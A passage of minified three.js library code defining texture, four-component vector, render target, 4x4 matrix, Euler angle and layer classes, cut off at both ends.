t.width>2048||t.height>2048?t.toDataURL("image/jpeg",.6):t.toDataURL("image/png")}},M=0;function S(e,t,i,n,r,o,a,s,c,l){Object.defineProperty(this,"id",{value:M++}),this.uuid=p.generateUUID(),this.name="",this.image=void 0!==e?e:S.DEFAULT_IMAGE,this.mipmaps=[],this.mapping=void 0!==t?t:S.DEFAULT_MAPPING,this.wrapS=void 0!==i?i:1001,this.wrapT=void 0!==n?n:1001,this.magFilter=void 0!==r?r:1006,this.minFilter=void 0!==o?o:1008,this.anisotropy=void 0!==c?c:1,this.format=void 0!==a?a:1023,this.type=void 0!==s?s:1009,this.offset=new f(0,0),this.repeat=new f(1,1),this.center=new f(0,0),this.rotation=0,this.matrixAutoUpdate=!0,this.matrix=new x,this.generateMipmaps=!0,this.premultiplyAlpha=!1,this.flipY=!0,this.unpackAlignment=4,this.encoding=void 0!==l?l:3e3,this.version=0,this.onUpdate=null}function T(e,t,i,n){this.x=e||0,this.y=t||0,this.z=i||0,this.w=void 0!==n?n:1}function E(e,t,i){this.width=e,this.height=t,this.scissor=new T(0,0,e,t),this.scissorTest=!1,this.viewport=new T(0,0,e,t),i=i||{},this.texture=new S(void 0,void 0,i.wrapS,i.wrapT,i.magFilter,i.minFilter,i.format,i.type,i.anisotropy,i.encoding),this.texture.image={},this.texture.image.width=e,this.texture.image.height=t,this.texture.generateMipmaps=void 0!==i.generateMipmaps&&i.generateMipmaps,this.texture.minFilter=void 0!==i.minFilter?i.minFilter:1006,this.depthBuffer=void 0===i.depthBuffer||i.depthBuffer,this.stencilBuffer=void 0===i.stencilBuffer||i.stencilBuffer,this.depthTexture=void 0!==i.depthTexture?i.depthTexture:null}function A(e,t,i){E.call(this,e,t,i),this.samples=4}S.DEFAULT_IMAGE=void 0,S.DEFAULT_MAPPING=300,S.prototype=Object.assign(Object.create(h.prototype),{constructor:S,isTexture:!0,updateMatrix:function(){this.matrix.setUvTransform(this.offset.x,this.offset.y,this.repeat.x,this.repeat.y,this.rotation,this.center.x,this.center.y)},clone:function(){return(new this.constructor).copy(this)},copy:function(e){return this.name=e.name,this.image=e.image,this.mipmaps=e.mipmaps.slice(0),this.mapping=e.mapping,this.wrapS=e.wrapS,this.wrapT=e.wrapT,this.magFilter=e.magFilter,this.minFilter=e.minFilter,this.anisotropy=e.anisotropy,this.format=e.format,this.type=e.type,this.offset.copy(e.offset),this.repeat.copy(e.repeat),this.center.copy(e.center),this.rotation=e.rotation,this.matrixAutoUpdate=e.matrixAutoUpdate,this.matrix.copy(e.matrix),this.generateMipmaps=e.generateMipmaps,this.premultiplyAlpha=e.premultiplyAlpha,this.flipY=e.flipY,this.unpackAlignment=e.unpackAlignment,this.encoding=e.encoding,this},toJSON:function(e){var t=void 0===e||"string"==typeof e;if(!t&&void 0!==e.textures[this.uuid])return e.textures[this.uuid];var i={metadata:{version:4.5,type:"Texture",generator:"Texture.toJSON"},uuid:this.uuid,name:this.name,mapping:this.mapping,repeat:[this.repeat.x,this.repeat.y],offset:[this.offset.x,this.offset.y],center:[this.center.x,this.center.y],rotation:this.rotation,wrap:[this.wrapS,this.wrapT],format:this.format,type:this.type,encoding:this.encoding,minFilter:this.minFilter,magFilter:this.magFilter,anisotropy:this.anisotropy,flipY:this.flipY,premultiplyAlpha:this.premultiplyAlpha,unpackAlignment:this.unpackAlignment};if(void 0!==this.image){var n=this.image;if(void 0===n.uuid&&(n.uuid=p.generateUUID()),!t&&void 0===e.images[n.uuid]){var r;if(Array.isArray(n)){r=[];for(var o=0,a=n.length;o<a;o++)r.push(_.getDataURL(n[o]))}else r=_.getDataURL(n);e.images[n.uuid]={uuid:n.uuid,url:r}}i.image=n.uuid}return t||(e.textures[this.uuid]=i),i},dispose:function(){this.dispatchEvent({type:"dispose"})},transformUv:function(e){if(300!==this.mapping)return e;if(e.applyMatrix3(this.matrix),e.x<0||e.x>1)switch(this.wrapS){case 1e3:e.x=e.x-Math.floor(e.x);break;case 1001:e.x=e.x<0?0:1;break;case 1002:1===Math.abs(Math.floor(e.x)%2)?e.x=Math.ceil(e.x)-e.x:e.x=e.x-Math.floor(e.x)}if(e.y<0||e.y>1)switch(this.wrapT){case 1e3:e.y=e.y-Math.floor(e.y);break;case 1001:e.y=e.y<0?0:1;break;case 1002:1===Math.abs(Math.floor(e.y)%2)?e.y=Math.ceil(e.y)-e.y:e.y=e.y-Math.floor(e.y)}return this.flipY&&(e.y=1-e.y),e}}),Object.defineProperty(S.prototype,"needsUpdate",{set:function(e){!0===e&&this.version++}}),Object.defineProperties(T.prototype,{width:{get:function(){return this.z},set:function(e){this.z=e}},height:{get:function(){return this.w},set:function(e){this.w=e}}}),Object.assign(T.prototype,{isVector4:!0,set:function(e,t,i,n){return this.x=e,this.y=t,this.z=i,this.w=n,this},setScalar:function(e){return this.x=e,this.y=e,this.z=e,this.w=e,this},setX:function(e){return this.x=e,this},setY:function(e){return this.y=e,this},setZ:function(e){return this.z=e,this},setW:function(e){return this.w=e,this},setComponent:function(e,t){switch(e){case 0:this.x=t;break;case 1:this.y=t;break;case 2:this.z=t;break;case 3:this.w=t;break;default:throw new Error("index is out of range: "+e)}return this},getComponent:function(e){switch(e){case 0:return this.x;case 1:return this.y;case 2:return this.z;case 3:return this.w;default:throw new Error("index is out of range: "+e)}},clone:function(){return new this.constructor(this.x,this.y,this.z,this.w)},copy:function(e){return this.x=e.x,this.y=e.y,this.z=e.z,this.w=void 0!==e.w?e.w:1,this},add:function(e,t){return void 0!==t?(console.warn("THREE.Vector4: .add() now only accepts one argument. Use .addVectors( a, b ) instead."),this.addVectors(e,t)):(this.x+=e.x,this.y+=e.y,this.z+=e.z,this.w+=e.w,this)},addScalar:function(e){return this.x+=e,this.y+=e,this.z+=e,this.w+=e,this},addVectors:function(e,t){return this.x=e.x+t.x,this.y=e.y+t.y,this.z=e.z+t.z,this.w=e.w+t.w,this},addScaledVector:function(e,t){return this.x+=e.x*t,this.y+=e.y*t,this.z+=e.z*t,this.w+=e.w*t,this},sub:function(e,t){return void 0!==t?(console.warn("THREE.Vector4: .sub() now only accepts one argument. Use .subVectors( a, b ) instead."),this.subVectors(e,t)):(this.x-=e.x,this.y-=e.y,this.z-=e.z,this.w-=e.w,this)},subScalar:function(e){return this.x-=e,this.y-=e,this.z-=e,this.w-=e,this},subVectors:function(e,t){return this.x=e.x-t.x,this.y=e.y-t.y,this.z=e.z-t.z,this.w=e.w-t.w,this},multiplyScalar:function(e){return this.x*=e,this.y*=e,this.z*=e,this.w*=e,this},applyMatrix4:function(e){var t=this.x,i=this.y,n=this.z,r=this.w,o=e.elements;return this.x=o[0]*t+o[4]*i+o[8]*n+o[12]*r,this.y=o[1]*t+o[5]*i+o[9]*n+o[13]*r,this.z=o[2]*t+o[6]*i+o[10]*n+o[14]*r,this.w=o[3]*t+o[7]*i+o[11]*n+o[15]*r,this},divideScalar:function(e){return this.multiplyScalar(1/e)},setAxisAngleFromQuaternion:function(e){this.w=2*Math.acos(e.w);var t=Math.sqrt(1-e.w*e.w);return t<1e-4?(this.x=1,this.y=0,this.z=0):(this.x=e.x/t,this.y=e.y/t,this.z=e.z/t),this},setAxisAngleFromRotationMatrix:function(e){var t,i,n,r,o=e.elements,a=o[0],s=o[4],c=o[8],l=o[1],h=o[5],u=o[9],d=o[2],p=o[6],f=o[10];if(Math.abs(s-l)<.01&&Math.abs(c-d)<.01&&Math.abs(u-p)<.01){if(Math.abs(s+l)<.1&&Math.abs(c+d)<.1&&Math.abs(u+p)<.1&&Math.abs(a+h+f-3)<.1)return this.set(1,0,0,0),this;t=Math.PI;var m=(a+1)/2,v=(h+1)/2,g=(f+1)/2,y=(s+l)/4,b=(c+d)/4,w=(u+p)/4;return m>v&&m>g?m<.01?(i=0,n=.707106781,r=.707106781):(n=y/(i=Math.sqrt(m)),r=b/i):v>g?v<.01?(i=.707106781,n=0,r=.707106781):(i=y/(n=Math.sqrt(v)),r=w/n):g<.01?(i=.707106781,n=.707106781,r=0):(i=b/(r=Math.sqrt(g)),n=w/r),this.set(i,n,r,t),this}var x=Math.sqrt((p-u)*(p-u)+(c-d)*(c-d)+(l-s)*(l-s));return Math.abs(x)<.001&&(x=1),this.x=(p-u)/x,this.y=(c-d)/x,this.z=(l-s)/x,this.w=Math.acos((a+h+f-1)/2),this},min:function(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this.z=Math.min(this.z,e.z),this.w=Math.min(this.w,e.w),this},max:function(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this.z=Math.max(this.z,e.z),this.w=Math.max(this.w,e.w),this},clamp:function(e,t){return this.x=Math.max(e.x,Math.min(t.x,this.x)),this.y=Math.max(e.y,Math.min(t.y,this.y)),this.z=Math.max(e.z,Math.min(t.z,this.z)),this.w=Math.max(e.w,Math.min(t.w,this.w)),this},clampScalar:function(e,t){return this.x=Math.max(e,Math.min(t,this.x)),this.y=Math.max(e,Math.min(t,this.y)),this.z=Math.max(e,Math.min(t,this.z)),this.w=Math.max(e,Math.min(t,this.w)),this},clampLength:function(e,t){var i=this.length();return this.divideScalar(i||1).multiplyScalar(Math.max(e,Math.min(t,i)))},floor:function(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this.w=Math.floor(this.w),this},ceil:function(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this.w=Math.ceil(this.w),this},round:function(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this.w=Math.round(this.w),this},roundToZero:function(){return this.x=this.x<0?Math.ceil(this.x):Math.floor(this.x),this.y=this.y<0?Math.ceil(this.y):Math.floor(this.y),this.z=this.z<0?Math.ceil(this.z):Math.floor(this.z),this.w=this.w<0?Math.ceil(this.w):Math.floor(this.w),this},negate:function(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this.w=-this.w,this},dot:function(e){return this.x*e.x+this.y*e.y+this.z*e.z+this.w*e.w},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w)},manhattanLength:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)+Math.abs(this.w)},normalize:function(){return this.divideScalar(this.length()||1)},setLength:function(e){return this.normalize().multiplyScalar(e)},lerp:function(e,t){return this.x+=(e.x-this.x)*t,this.y+=(e.y-this.y)*t,this.z+=(e.z-this.z)*t,this.w+=(e.w-this.w)*t,this},lerpVectors:function(e,t,i){return this.subVectors(t,e).multiplyScalar(i).add(e)},equals:function(e){return e.x===this.x&&e.y===this.y&&e.z===this.z&&e.w===this.w},fromArray:function(e,t){return void 0===t&&(t=0),this.x=e[t],this.y=e[t+1],this.z=e[t+2],this.w=e[t+3],this},toArray:function(e,t){return void 0===e&&(e=[]),void 0===t&&(t=0),e[t]=this.x,e[t+1]=this.y,e[t+2]=this.z,e[t+3]=this.w,e},fromBufferAttribute:function(e,t,i){return void 0!==i&&console.warn("THREE.Vector4: offset has been removed from .fromBufferAttribute()."),this.x=e.getX(t),this.y=e.getY(t),this.z=e.getZ(t),this.w=e.getW(t),this}}),E.prototype=Object.assign(Object.create(h.prototype),{constructor:E,isWebGLRenderTarget:!0,setSize:function(e,t){this.width===e&&this.height===t||(this.width=e,this.height=t,this.texture.image.width=e,this.texture.image.height=t,this.dispose()),this.viewport.set(0,0,e,t),this.scissor.set(0,0,e,t)},clone:function(){return(new this.constructor).copy(this)},copy:function(e){return this.width=e.width,this.height=e.height,this.viewport.copy(e.viewport),this.texture=e.texture.clone(),this.depthBuffer=e.depthBuffer,this.stencilBuffer=e.stencilBuffer,this.depthTexture=e.depthTexture,this},dispose:function(){this.dispatchEvent({type:"dispose"})}}),A.prototype=Object.assign(Object.create(E.prototype),{constructor:A,isWebGLMultisampleRenderTarget:!0,copy:function(e){return E.prototype.copy.call(this,e),this.samples=e.samples,this}});var C=new y,P=new B,L=new y(0,0,0),R=new y(1,1,1),k=new y,O=new y,I=new y;function B(){this.elements=[1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1],arguments.length>0&&console.error("THREE.Matrix4: the constructor no longer reads arguments. use .set() instead.")}Object.assign(B.prototype,{isMatrix4:!0,set:function(e,t,i,n,r,o,a,s,c,l,h,u,d,p,f,m){var v=this.elements;return v[0]=e,v[4]=t,v[8]=i,v[12]=n,v[1]=r,v[5]=o,v[9]=a,v[13]=s,v[2]=c,v[6]=l,v[10]=h,v[14]=u,v[3]=d,v[7]=p,v[11]=f,v[15]=m,this},identity:function(){return this.set(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1),this},clone:function(){return(new B).fromArray(this.elements)},copy:function(e){var t=this.elements,i=e.elements;return t[0]=i[0],t[1]=i[1],t[2]=i[2],t[3]=i[3],t[4]=i[4],t[5]=i[5],t[6]=i[6],t[7]=i[7],t[8]=i[8],t[9]=i[9],t[10]=i[10],t[11]=i[11],t[12]=i[12],t[13]=i[13],t[14]=i[14],t[15]=i[15],this},copyPosition:function(e){var t=this.elements,i=e.elements;return t[12]=i[12],t[13]=i[13],t[14]=i[14],this},extractBasis:function(e,t,i){return e.setFromMatrixColumn(this,0),t.setFromMatrixColumn(this,1),i.setFromMatrixColumn(this,2),this},makeBasis:function(e,t,i){return this.set(e.x,t.x,i.x,0,e.y,t.y,i.y,0,e.z,t.z,i.z,0,0,0,0,1),this},extractRotation:function(e){var t=this.elements,i=e.elements,n=1/C.setFromMatrixColumn(e,0).length(),r=1/C.setFromMatrixColumn(e,1).length(),o=1/C.setFromMatrixColumn(e,2).length();return t[0]=i[0]*n,t[1]=i[1]*n,t[2]=i[2]*n,t[3]=0,t[4]=i[4]*r,t[5]=i[5]*r,t[6]=i[6]*r,t[7]=0,t[8]=i[8]*o,t[9]=i[9]*o,t[10]=i[10]*o,t[11]=0,t[12]=0,t[13]=0,t[14]=0,t[15]=1,this},makeRotationFromEuler:function(e){e&&e.isEuler||console.error("THREE.Matrix4: .makeRotationFromEuler() now expects a Euler rotation rather than a Vector3 and order.");var t=this.elements,i=e.x,n=e.y,r=e.z,o=Math.cos(i),a=Math.sin(i),s=Math.cos(n),c=Math.sin(n),l=Math.cos(r),h=Math.sin(r);if("XYZ"===e.order){var u=o*l,d=o*h,p=a*l,f=a*h;t[0]=s*l,t[4]=-s*h,t[8]=c,t[1]=d+p*c,t[5]=u-f*c,t[9]=-a*s,t[2]=f-u*c,t[6]=p+d*c,t[10]=o*s}else if("YXZ"===e.order){var m=s*l,v=s*h,g=c*l,y=c*h;t[0]=m+y*a,t[4]=g*a-v,t[8]=o*c,t[1]=o*h,t[5]=o*l,t[9]=-a,t[2]=v*a-g,t[6]=y+m*a,t[10]=o*s}else if("ZXY"===e.order){m=s*l,v=s*h,g=c*l,y=c*h;t[0]=m-y*a,t[4]=-o*h,t[8]=g+v*a,t[1]=v+g*a,t[5]=o*l,t[9]=y-m*a,t[2]=-o*c,t[6]=a,t[10]=o*s}else if("ZYX"===e.order){u=o*l,d=o*h,p=a*l,f=a*h;t[0]=s*l,t[4]=p*c-d,t[8]=u*c+f,t[1]=s*h,t[5]=f*c+u,t[9]=d*c-p,t[2]=-c,t[6]=a*s,t[10]=o*s}else if("YZX"===e.order){var b=o*s,w=o*c,x=a*s,_=a*c;t[0]=s*l,t[4]=_-b*h,t[8]=x*h+w,t[1]=h,t[5]=o*l,t[9]=-a*l,t[2]=-c*l,t[6]=w*h+x,t[10]=b-_*h}else if("XZY"===e.order){b=o*s,w=o*c,x=a*s,_=a*c;t[0]=s*l,t[4]=-h,t[8]=c*l,t[1]=b*h+_,t[5]=o*l,t[9]=w*h-x,t[2]=x*h-w,t[6]=a*l,t[10]=_*h+b}return t[3]=0,t[7]=0,t[11]=0,t[12]=0,t[13]=0,t[14]=0,t[15]=1,this},makeRotationFromQuaternion:function(e){return this.compose(L,e,R)},lookAt:function(e,t,i){var n=this.elements;return I.subVectors(e,t),0===I.lengthSq()&&(I.z=1),I.normalize(),k.crossVectors(i,I),0===k.lengthSq()&&(1===Math.abs(i.z)?I.x+=1e-4:I.z+=1e-4,I.normalize(),k.crossVectors(i,I)),k.normalize(),O.crossVectors(I,k),n[0]=k.x,n[4]=O.x,n[8]=I.x,n[1]=k.y,n[5]=O.y,n[9]=I.y,n[2]=k.z,n[6]=O.z,n[10]=I.z,this},multiply:function(e,t){return void 0!==t?(console.warn("THREE.Matrix4: .multiply() now only accepts one argument. Use .multiplyMatrices( a, b ) instead."),this.multiplyMatrices(e,t)):this.multiplyMatrices(this,e)},premultiply:function(e){return this.multiplyMatrices(e,this)},multiplyMatrices:function(e,t){var i=e.elements,n=t.elements,r=this.elements,o=i[0],a=i[4],s=i[8],c=i[12],l=i[1],h=i[5],u=i[9],d=i[13],p=i[2],f=i[6],m=i[10],v=i[14],g=i[3],y=i[7],b=i[11],w=i[15],x=n[0],_=n[4],M=n[8],S=n[12],T=n[1],E=n[5],A=n[9],C=n[13],P=n[2],L=n[6],R=n[10],k=n[14],O=n[3],I=n[7],B=n[11],D=n[15];return r[0]=o*x+a*T+s*P+c*O,r[4]=o*_+a*E+s*L+c*I,r[8]=o*M+a*A+s*R+c*B,r[12]=o*S+a*C+s*k+c*D,r[1]=l*x+h*T+u*P+d*O,r[5]=l*_+h*E+u*L+d*I,r[9]=l*M+h*A+u*R+d*B,r[13]=l*S+h*C+u*k+d*D,r[2]=p*x+f*T+m*P+v*O,r[6]=p*_+f*E+m*L+v*I,r[10]=p*M+f*A+m*R+v*B,r[14]=p*S+f*C+m*k+v*D,r[3]=g*x+y*T+b*P+w*O,r[7]=g*_+y*E+b*L+w*I,r[11]=g*M+y*A+b*R+w*B,r[15]=g*S+y*C+b*k+w*D,this},multiplyScalar:function(e){var t=this.elements;return t[0]*=e,t[4]*=e,t[8]*=e,t[12]*=e,t[1]*=e,t[5]*=e,t[9]*=e,t[13]*=e,t[2]*=e,t[6]*=e,t[10]*=e,t[14]*=e,t[3]*=e,t[7]*=e,t[11]*=e,t[15]*=e,this},applyToBufferAttribute:function(e){for(var t=0,i=e.count;t<i;t++)C.x=e.getX(t),C.y=e.getY(t),C.z=e.getZ(t),C.applyMatrix4(this),e.setXYZ(t,C.x,C.y,C.z);return e},determinant:function(){var e=this.elements,t=e[0],i=e[4],n=e[8],r=e[12],o=e[1],a=e[5],s=e[9],c=e[13],l=e[2],h=e[6],u=e[10],d=e[14];return e[3]*(+r*s*h-n*c*h-r*a*u+i*c*u+n*a*d-i*s*d)+e[7]*(+t*s*d-t*c*u+r*o*u-n*o*d+n*c*l-r*s*l)+e[11]*(+t*c*h-t*a*d-r*o*h+i*o*d+r*a*l-i*c*l)+e[15]*(-n*a*l-t*s*h+t*a*u+n*o*h-i*o*u+i*s*l)},transpose:function(){var e,t=this.elements;return e=t[1],t[1]=t[4],t[4]=e,e=t[2],t[2]=t[8],t[8]=e,e=t[6],t[6]=t[9],t[9]=e,e=t[3],t[3]=t[12],t[12]=e,e=t[7],t[7]=t[13],t[13]=e,e=t[11],t[11]=t[14],t[14]=e,this},setPosition:function(e,t,i){var n=this.elements;return e.isVector3?(n[12]=e.x,n[13]=e.y,n[14]=e.z):(n[12]=e,n[13]=t,n[14]=i),this},getInverse:function(e,t){var i=this.elements,n=e.elements,r=n[0],o=n[1],a=n[2],s=n[3],c=n[4],l=n[5],h=n[6],u=n[7],d=n[8],p=n[9],f=n[10],m=n[11],v=n[12],g=n[13],y=n[14],b=n[15],w=p*y*u-g*f*u+g*h*m-l*y*m-p*h*b+l*f*b,x=v*f*u-d*y*u-v*h*m+c*y*m+d*h*b-c*f*b,_=d*g*u-v*p*u+v*l*m-c*g*m-d*l*b+c*p*b,M=v*p*h-d*g*h-v*l*f+c*g*f+d*l*y-c*p*y,S=r*w+o*x+a*_+s*M;if(0===S){var T="THREE.Matrix4: .getInverse() can't invert matrix, determinant is 0";if(!0===t)throw new Error(T);return console.warn(T),this.identity()}var E=1/S;return i[0]=w*E,i[1]=(g*f*s-p*y*s-g*a*m+o*y*m+p*a*b-o*f*b)*E,i[2]=(l*y*s-g*h*s+g*a*u-o*y*u-l*a*b+o*h*b)*E,i[3]=(p*h*s-l*f*s-p*a*u+o*f*u+l*a*m-o*h*m)*E,i[4]=x*E,i[5]=(d*y*s-v*f*s+v*a*m-r*y*m-d*a*b+r*f*b)*E,i[6]=(v*h*s-c*y*s-v*a*u+r*y*u+c*a*b-r*h*b)*E,i[7]=(c*f*s-d*h*s+d*a*u-r*f*u-c*a*m+r*h*m)*E,i[8]=_*E,i[9]=(v*p*s-d*g*s-v*o*m+r*g*m+d*o*b-r*p*b)*E,i[10]=(c*g*s-v*l*s+v*o*u-r*g*u-c*o*b+r*l*b)*E,i[11]=(d*l*s-c*p*s-d*o*u+r*p*u+c*o*m-r*l*m)*E,i[12]=M*E,i[13]=(d*g*a-v*p*a+v*o*f-r*g*f-d*o*y+r*p*y)*E,i[14]=(v*l*a-c*g*a-v*o*h+r*g*h+c*o*y-r*l*y)*E,i[15]=(c*p*a-d*l*a+d*o*h-r*p*h-c*o*f+r*l*f)*E,this},scale:function(e){var t=this.elements,i=e.x,n=e.y,r=e.z;return t[0]*=i,t[4]*=n,t[8]*=r,t[1]*=i,t[5]*=n,t[9]*=r,t[2]*=i,t[6]*=n,t[10]*=r,t[3]*=i,t[7]*=n,t[11]*=r,this},getMaxScaleOnAxis:function(){var e=this.elements,t=e[0]*e[0]+e[1]*e[1]+e[2]*e[2],i=e[4]*e[4]+e[5]*e[5]+e[6]*e[6],n=e[8]*e[8]+e[9]*e[9]+e[10]*e[10];return Math.sqrt(Math.max(t,i,n))},makeTranslation:function(e,t,i){return this.set(1,0,0,e,0,1,0,t,0,0,1,i,0,0,0,1),this},makeRotationX:function(e){var t=Math.cos(e),i=Math.sin(e);return this.set(1,0,0,0,0,t,-i,0,0,i,t,0,0,0,0,1),this},makeRotationY:function(e){var t=Math.cos(e),i=Math.sin(e);return this.set(t,0,i,0,0,1,0,0,-i,0,t,0,0,0,0,1),this},makeRotationZ:function(e){var t=Math.cos(e),i=Math.sin(e);return this.set(t,-i,0,0,i,t,0,0,0,0,1,0,0,0,0,1),this},makeRotationAxis:function(e,t){var i=Math.cos(t),n=Math.sin(t),r=1-i,o=e.x,a=e.y,s=e.z,c=r*o,l=r*a;return this.set(c*o+i,c*a-n*s,c*s+n*a,0,c*a+n*s,l*a+i,l*s-n*o,0,c*s-n*a,l*s+n*o,r*s*s+i,0,0,0,0,1),this},makeScale:function(e,t,i){return this.set(e,0,0,0,0,t,0,0,0,0,i,0,0,0,0,1),this},makeShear:function(e,t,i){return this.set(1,t,i,0,e,1,i,0,e,t,1,0,0,0,0,1),this},compose:function(e,t,i){var n=this.elements,r=t._x,o=t._y,a=t._z,s=t._w,c=r+r,l=o+o,h=a+a,u=r*c,d=r*l,p=r*h,f=o*l,m=o*h,v=a*h,g=s*c,y=s*l,b=s*h,w=i.x,x=i.y,_=i.z;return n[0]=(1-(f+v))*w,n[1]=(d+b)*w,n[2]=(p-y)*w,n[3]=0,n[4]=(d-b)*x,n[5]=(1-(u+v))*x,n[6]=(m+g)*x,n[7]=0,n[8]=(p+y)*_,n[9]=(m-g)*_,n[10]=(1-(u+f))*_,n[11]=0,n[12]=e.x,n[13]=e.y,n[14]=e.z,n[15]=1,this},decompose:function(e,t,i){var n=this.elements,r=C.set(n[0],n[1],n[2]).length(),o=C.set(n[4],n[5],n[6]).length(),a=C.set(n[8],n[9],n[10]).length();this.determinant()<0&&(r=-r),e.x=n[12],e.y=n[13],e.z=n[14],P.copy(this);var s=1/r,c=1/o,l=1/a;return P.elements[0]*=s,P.elements[1]*=s,P.elements[2]*=s,P.elements[4]*=c,P.elements[5]*=c,P.elements[6]*=c,P.elements[8]*=l,P.elements[9]*=l,P.elements[10]*=l,t.setFromRotationMatrix(P),i.x=r,i.y=o,i.z=a,this},makePerspective:function(e,t,i,n,r,o){void 0===o&&console.warn("THREE.Matrix4: .makePerspective() has been redefined and has a new signature. Please check the docs.");var a=this.elements,s=2*r/(t-e),c=2*r/(i-n),l=(t+e)/(t-e),h=(i+n)/(i-n),u=-(o+r)/(o-r),d=-2*o*r/(o-r);return a[0]=s,a[4]=0,a[8]=l,a[12]=0,a[1]=0,a[5]=c,a[9]=h,a[13]=0,a[2]=0,a[6]=0,a[10]=u,a[14]=d,a[3]=0,a[7]=0,a[11]=-1,a[15]=0,this},makeOrthographic:function(e,t,i,n,r,o){var a=this.elements,s=1/(t-e),c=1/(i-n),l=1/(o-r),h=(t+e)*s,u=(i+n)*c,d=(o+r)*l;return a[0]=2*s,a[4]=0,a[8]=0,a[12]=-h,a[1]=0,a[5]=2*c,a[9]=0,a[13]=-u,a[2]=0,a[6]=0,a[10]=-2*l,a[14]=-d,a[3]=0,a[7]=0,a[11]=0,a[15]=1,this},equals:function(e){for(var t=this.elements,i=e.elements,n=0;n<16;n++)if(t[n]!==i[n])return!1;return!0},fromArray:function(e,t){void 0===t&&(t=0);for(var i=0;i<16;i++)this.elements[i]=e[i+t];return this},toArray:function(e,t){void 0===e&&(e=[]),void 0===t&&(t=0);var i=this.elements;return e[t]=i[0],e[t+1]=i[1],e[t+2]=i[2],e[t+3]=i[3],e[t+4]=i[4],e[t+5]=i[5],e[t+6]=i[6],e[t+7]=i[7],e[t+8]=i[8],e[t+9]=i[9],e[t+10]=i[10],e[t+11]=i[11],e[t+12]=i[12],e[t+13]=i[13],e[t+14]=i[14],e[t+15]=i[15],e}});var D=new B,z=new m;function F(e,t,i,n){this._x=e||0,this._y=t||0,this._z=i||0,this._order=n||F.DefaultOrder}function N(){this.mask=1}F.RotationOrders=["XYZ","YZX","ZXY","XZY","YXZ","ZYX"],F.DefaultOrder="XYZ",Object.defineProperties(F.prototype,{x:{get:function(){return this._x},set:function(e){this._x=e,this._onChangeCallback()}},y:{get:function(){return this._y},set:function(e){this._y=e,this._onChangeCallback()}},z:{get:function(){return this._z},set:function(e){this._z=e,this._onChangeCallback()}},order:{get:function(){return this._order},set:function(e){this._order=e,this._onChangeCallback()}}}),Object.assign(F.prototype,{isEuler:!0,set:function(e,t,i,n){return this._x=e,this._y=t,this._z=i,this._order=n||this._order,this._onChangeCallback(),this},clone:function(){return new this.constructor(this._x,this._y,this._z,this._order)},copy:function(e){return this._x=e._x,this._y=e._y,this._z=e._z,this._order=e._order,this._onChangeCallback(),this},setFromRotationMatrix:function(e,t,i){var n=p.clamp,r=e.elements,o=r[0],a=r[4],s=r[8],c=r[1],l=r[5],h=r[9],u=r[2],d=r[6],f=r[10];return"XYZ"===(t=t||this._order)?(this._y=Math.asin(n(s,-1,1)),Math.abs(s)<.9999999?(this._x=Math.atan2(-h,f),this._z=Math.atan2(-a,o)):(this._x=Math.atan2(d,l),this._z=0)):"YXZ"===t?(this._x=Math.asin(-n(h,-1,1)),Math.abs(h)<.9999999?(this._y=Math.atan2(s,f),this._z=Math.atan2(c,l)):(this._y=Math.atan2(-u,o),this._z=0)):"ZXY"===t?(this._x=Math.asin(n(d,-1,1)),Math.abs(d)<.9999999?(this._y=Math.atan2(-u,f),this._z=Math.atan2(-a,l)):(this._y=0,this._z=Math.atan2(c,o))):"ZYX"===t?(this._y=Math.asin(-n(u,-1,1)),Math.abs(u)<.9999999?(this._x=Math.atan2(d,f),this._z=Math.atan2(c,o)):(this._x=0,this._z=Math.atan2(-a,l))):"YZX"===t?(this._z=Math.asin(n(c,-1,1)),Math.abs(c)<.9999999?(this._x=Math.atan2(-h,l),this._y=Math.atan2(-u,o)):(this._x=0,this._y=Math.atan2(s,f))):"XZY"===t?(this._z=Math.asin(-n(a,-1,1)),Math.abs(a)<.9999999?(this._x=Math.atan2(d,l),this._y=Math.atan2(s,o)):(this._x=Math.atan2(-h,f),this._y=0)):console.warn("THREE.Euler: .setFromRotationMatrix() given unsupported order: "+t),this._order=t,!1!==i&&this._onChangeCallback(),this},setFromQuaternion:function(e,t,i){return D.makeRotationFromQuaternion(e),this.setFromRotationMatrix(D,t,i)},setFromVector3:function(e,t){return this.set(e.x,e.y,e.z,t||this._order)},reorder:function(e){return z.setFromEuler(this),this.setFromQuaternion(z,e)},equals:function(e){return e._x===this._x&&e._y===this._y&&e._z===this._z&&e._order===this._order},fromArray:function(e){return this._x=e[0],this._y=e[1],this._z=e[2],void 0!==e[3]&&(this._order=e[3]),this._onChangeCallback(),this},toArray:function(e,t){return void 0===e&&(e=[]),void 0===t&&(t=0),e[t]=this._x,e[t+1]=this._y,e[t+2]=this._z,e[t+3]=this._order,e},toVector3:function(e){return e?e.set(this._x,this._y,this._z):new y(this._x,this._y,this._z)},_onChange:function(e){return this._onChangeCallback=e,this},_onChangeCallback:function(){}}),Object.assign(N.prototype,{set:function(e){this.mask=1<<e|0},enable:function(e){this.mask|=1<<e|0},enableAll:function(){this.mask=-1},toggle:function(e){this.mask^=1<<e|0},disable:function(e){this.mask&=~(1<<e|0)},disableAll:function(){this.mask=0},test:function(e){return 0!=(this.mask&e.mask)}});var j=0,U=new y,V=new m,H=new B,G=new y,W=new y,q=new y,X=new m,Y=new y(1,0,0),Z=new y(0,1,0),Q=new y(0,0,1),$={type:"added"},J={type:"removed"};function K(){Object.defineProperty(this,"id",{value:j++}),this.uuid=p.generateUUID(),this.name="",this.type="Object3D",this.parent=null,this.children=[],this.up=K.DefaultUp.clone();var e=new y,t=new F,i=new m,n=new y(1,1,1);t._onChange((function(){i.setFromEuler(t,!1)})),i._onChange((function(){t.setFromQuaternion(i,void 